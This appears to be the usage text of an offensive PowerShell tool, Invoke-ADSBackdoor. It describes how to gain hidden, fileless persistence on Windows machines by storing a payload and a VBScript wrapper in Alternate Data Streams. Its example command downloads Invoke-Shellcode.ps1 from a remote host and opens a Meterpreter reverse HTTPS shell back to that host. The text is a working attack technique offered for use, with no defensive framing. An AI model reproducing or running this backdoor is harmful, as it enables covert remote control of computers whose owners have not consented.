This script will obtain fileless persistence on a Windows 7+ machine under both Standard and Administrative accounts by 
using two Alternate Data Streams. The first Alternate Data stream stores the payloadand the second Alternate Data Stream 
stores some VBScript that acts as a wrapper in order to hide the DOS prompt when invoking the data stream containing the 
payload. When passing the arguments, you have to include the function and any parameters required by your payload. 
The arguments must also be in quotation marks.

Example:
PS C:\Users\test\Desktop> Invoke-ADSBackdoor -URL http://192.168.1.138/Invoke-Shellcode.ps1 -Arguments "Invoke-Shellcode
 -Lhost 192.168.1.138 -LPort 2222 -Payload windows/meterpreter/reverse_https -Force"
This will use the function Invoke-Shellcode in Invoke-Shellcode.ps1 to shovel meterpreter back to 192.168.1.138 on port 
2222 over HTTPS. 
